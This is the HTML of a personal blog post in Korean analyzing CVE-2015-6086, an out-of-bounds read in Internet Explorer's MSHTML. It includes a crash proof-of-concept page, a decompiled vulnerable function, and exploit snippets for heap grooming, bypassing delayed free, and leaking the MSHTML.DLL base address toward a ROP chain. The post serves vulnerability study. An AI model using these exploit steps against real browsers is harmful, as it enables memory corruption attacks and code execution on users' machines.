@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.haklog.xyz","root":"/","scheme":"Gemini","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="CVE - 2015 - 6086">
+<meta name="keywords" content="exploit, pwn, analyze">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE - 2015 - 6086">
+<meta property="og:url" content="https://blog.haklog.xyz/2020/03/23/CVE_-_2015_-_6086/index.html">
+<meta property="og:site_name" content="귀찮다">
+<meta property="og:description" content="CVE - 2015 - 6086">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-03-23T20:24:27.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CVE - 2015 - 6086">
+<meta name="twitter:description" content="CVE - 2015 - 6086">
+
+<link rel="canonical" href="https://blog.haklog.xyz/2020/03/23/CVE_-_2015_-_6086/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>CVE - 2015 - 6086 | 귀찮다</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">귀찮다</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blog.haklog.xyz/2020/03/23/CVE_-_2015_-_6086/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kermit.png">
+      <meta itemprop="name" content="PUEL">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="귀찮다">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CVE - 2015 - 6086
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-03-23 20:23:17 / Modified: 20:24:27" itemprop="dateCreated datePublished" datetime="2020-03-23T20:23:17+00:00">2020-03-23</time>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2020/03/23/CVE_-_2015_-_6086/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/03/23/CVE_-_2015_-_6086/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CVE-2015-6086"><a href="#CVE-2015-6086" class="headerlink" title="CVE - 2015 - 6086"></a>CVE - 2015 - 6086</h1><a id="more"></a>
+
+<p>개인적으로 보려고 작성한지라 설명이 부족할 수 있다.<br>이 링크에 있는 익스를 보며 알게된 내용을 간략하게 적어봤다.</p>
+<h1 id="VULN"><a href="#VULN" class="headerlink" title="VULN"></a>VULN</h1><p>crash code </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Exploitation Challenge 1: Heap Alignment<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">'Cache-Control'</span> <span class="attr">content</span>=<span class="string">'no-cache'</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"expires"</span> <span class="attr">content</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        //</span></span><br><span class="line"><span class="undefined">        // Exploitation Challenge 1: The first challenge is Heap Alignment</span></span><br><span class="line"><span class="undefined">        //</span></span><br><span class="line"><span class="undefined">        function trigger() &#123;</span></span><br><span class="line"><span class="undefined">            alert("Attach the debugger\nSet the break points");</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">            var polyLine = document.createElementNS('http://www.w3.org/2000/svg', 'polyline');</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">            //</span></span><br><span class="line"><span class="undefined">            // Try commenting out the statement one by one and examine memory</span></span><br><span class="line"><span class="undefined">            //</span></span><br><span class="line"><span class="undefined">            //polyLine.setAttributeNS(null, 'requiredFeatures', "\n");</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">            //</span></span><br><span class="line"><span class="undefined">            // Comment the above line and uncomment comment below line and examine memory</span></span><br><span class="line"><span class="undefined">            //</span></span><br><span class="line"><span class="undefined">            polyLine.setAttributeNS(null, 'requiredFeatures', "\n\n\n\n\n\n\n\n\n");</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">'trigger();'</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>이 코드를 취약한 버전에서 열면 crash가 발생하는데, 해당 크래쉬를 분석하면<br><code> polyLine.setAttributeNS(null, 'requiredFeatures', "\n\n\n\n\n\n\n\n\n");</code><br>에서 크래쉬가 터진 것을 확인할 수 있으며,<br>MSHTML!CDOMStringDataList::InitFromString 함수에서 취약점이 발생함을 알 수 있다.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">HRESULT __thiscall CDOMStringDataList::InitFromString(CDOMStringDataList *<span class="keyword">this</span>, LPCWSTR lpCWStr)</span><br><span class="line">&#123;</span><br><span class="line">  SIZE_T strLen; <span class="comment">// Used in different places differently</span></span><br><span class="line">  HRESULT hResult;</span><br><span class="line">  PWCHAR pCurChar;</span><br><span class="line">  CStr *pCStr;</span><br><span class="line">  PWCHAR pCurString;</span><br><span class="line">  CDOMStringDataList *pCDOMStringDataList;</span><br><span class="line">  <span class="keyword">int</span> outString;</span><br><span class="line"></span><br><span class="line">  strLen = <span class="number">0</span>;</span><br><span class="line">  pCDOMStringDataList = <span class="keyword">this</span>;</span><br><span class="line">  hResult = S_OK;</span><br><span class="line">  CDOMStringDataList::Clear(<span class="keyword">this</span>);</span><br><span class="line">  pCurChar = (PWCHAR)lpCWStr;</span><br><span class="line">  <span class="keyword">while</span> ( *pCurChar != (_WORD)strLen )</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( IsCharSpaceW(*pCurChar) ) <span class="comment">// here! 모든 문자가 공백이라면 포인터가 한없이 증가하게 된다! </span></span><br><span class="line">      ++pCurChar;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( *pCurChar == <span class="string">','</span> )</span><br><span class="line">      <span class="keyword">return</span> E_FAIL;</span><br><span class="line">    pCurString = pCurChar;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++pCurChar;</span><br><span class="line">      ++strLen;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !IsCharSpaceW(*pCurChar) &amp;&amp; *pCurChar != <span class="string">','</span> &amp;&amp; *pCurChar );</span><br><span class="line">    outString = <span class="literal">NULL</span>;</span><br><span class="line">    hResult = CImplAry::AppendIndirect&lt;<span class="number">4</span>&gt;(pCDOMStringDataList, &amp;outString, &amp;pCStr);</span><br><span class="line">    <span class="keyword">if</span> ( hResult &lt; <span class="number">0</span> || (hResult = CStr::Set(pCStr, (LPVOID)strLen, pCurString, strLen, <span class="number">1</span>), hResult &lt; <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      CStr::_Free((CStr *)&amp;outString);</span><br><span class="line">      <span class="keyword">return</span> hResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( IsCharSpaceW(*pCurChar) )</span><br><span class="line">      ++pCurChar;</span><br><span class="line">    <span class="keyword">if</span> ( *pCurChar == <span class="string">','</span> )</span><br><span class="line">      ++pCurChar;</span><br><span class="line">    CStr::_Free((CStr *)&amp;outString);</span><br><span class="line">    strLen = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> hResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>주석처리 한 부분에서 부실한 입력값 검사로 인해 취약점이 발생한다. </p>
+<h1 id="LEAK"><a href="#LEAK" class="headerlink" title="LEAK"></a>LEAK</h1><p>이젠 OOB READ를 통해 주소값을 LEAK하면 될 것이다. 어떻게 해야할까?<br>requiredFeatures.getItem(1) 메소드를 이용하면 된다. 이 메소드는 공백 문자열을 통해 다음 문자열을 판단하므로 객체 뒤쪽의 메모리를 읽어올 수 있다!</p>
+<p>객체는 일반적으로 힙에 할당되므로 풍수 잘 맞춰서 vtable 릭하면 될 것 같다. 과연 그럴까?</p>
+<p>Isolated HEAP 이라는 보호 기법 때문에 안된다. 이 보호기법은 일부 객체들을 서로 다른 힙에 할당한다. 즉 객체를 격리하며 변조되는걸 막는다는 이야기이다.<br>하지만 requiredFeatures는 Isolated heap이 아니라 PROCESS heap에 할당되므로 걱정할 필요 없다. 이제 requiredFeatures가 아닌 process heap에 할당되는 다른 객체를 찾기만 하면<br>vtable을 읽어 메모리값을 leak 할 수 있다는 이야기이다!</p>
+<p>내가 공부한 문서에서는 CDOMMSGestureEvent 객체를 사용했다. 이 객체도 processHeap에 할당되기 때문이다. 그러므로 이 객체들을 잘 배열하여 VTABLE 주소를 LEAK하고, MSHTML.DLL의 베이스 주소를 릭하면 된다!!</p>
+<p>객체들을 잘 배열하는 방법은 다음과 같다. </p>
+<ol>
+<li>여러개의 CDOMMSGestureEvent를 할당하고, 띄엄띄엄 객체를 하나씩 해제한다.</li>
+<li>requiredFeatures 객체를 할당한다.</li>
+</ol>
+<p>하지만 다음과 같은 보호기법을 고려해야한다.</p>
+<blockquote>
+<p>MEMORY PROTECT : 객체는 즉시 해제되지 않고 해제한 객체의 크기가 일정 값을 초과할때까지 모아놨다가 한번에 해제함 </p>
+</blockquote>
+<p>익스코드중 일부다 </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CollectGarbage2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> video = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">250</span>; i++) &#123;</span><br><span class="line">        video[i] = <span class="built_in">document</span>.createElement(<span class="string">'video'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    video = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    CollectGarbage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">     eventArray[i] = <span class="built_in">document</span>.createEvent(<span class="string">'MsGestureEvent'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">0x500</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">     eventArray[i] = <span class="literal">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> CollectGarbage2();</span><br></pre></td></tr></table></figure>
+
+<p>임의의 객체를 다수 생성하고, 한번에 해제하는 방식으로 우회하고 있다.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (polyLineArray[i].requiredFeatures.numberOfItems == <span class="number">2</span> &amp;&amp; polyLineArray[i].requiredFeatures.getItem(<span class="number">1</span>).length == <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> OOBReadMemory = <span class="built_in">escape</span>(polyLineArray[i].requiredFeatures.getItem(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> spitValue = OOBReadMemory.split(<span class="string">'%'</span>);</span><br><span class="line">    <span class="keyword">var</span> CDOMMSGestureEvent_VFTablePointer = <span class="built_in">parseInt</span>(<span class="string">'0x'</span> + spitValue[<span class="number">3</span>].replace(<span class="string">'u'</span>, <span class="string">''</span>) + spitValue[<span class="number">2</span>].replace(<span class="string">'u'</span>, <span class="string">''</span>));</span><br><span class="line">    <span class="keyword">var</span> MSHTMLBaseAddress = CDOMMSGestureEvent_VFTablePointer - offsetOfMSHTMLBaseAddress;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> message = <span class="string">'MSHTML.DLL Base Address: 0x'</span> + MSHTMLBaseAddress.toString(<span class="number">16</span>);</span><br><span class="line">    message += <span class="string">'\n'</span>;</span><br><span class="line">    message += <span class="string">'CDOMMSGestureEvent VFTable Pointer: 0x'</span> + CDOMMSGestureEvent_VFTablePointer.toString(<span class="number">16</span>);</span><br><span class="line">    alert(message);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    exploitSuccessful = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>getitem 메소드로 MSHTML.DLL의 주소를 얻는 코드다. 이젠 이 주소를 기반으로 rop체인을 형성할 수 있게 됐다!</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/exploit-pwn-analyze/" rel="tag"># exploit, pwn, analyze</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/12/CODEGATE_2018_7amebox1/" rel="prev" title="7amebox1">
+      <i class="fa fa-chevron-left"></i> 7amebox1
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2015-6086"><span class="nav-number">1.</span> <span class="nav-text">CVE - 2015 - 6086</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#VULN"><span class="nav-number">2.</span> <span class="nav-text">VULN</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LEAK"><span class="nav-number">3.</span> <span class="nav-text">LEAK</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="PUEL"
+      src="/images/kermit.png">
+  <p class="site-author-name" itemprop="name">PUEL</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-PUEL"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">PUEL</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://haklog.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  var disqus_config = function() {
+    this.page.url = "https://blog.haklog.xyz/2020/03/23/CVE_-_2015_-_6086/";
+    this.page.identifier = "2020/03/23/CVE_-_2015_-_6086/";
+    this.page.title = "CVE - 2015 - 6086";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://haklog.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+</body>
+</html>
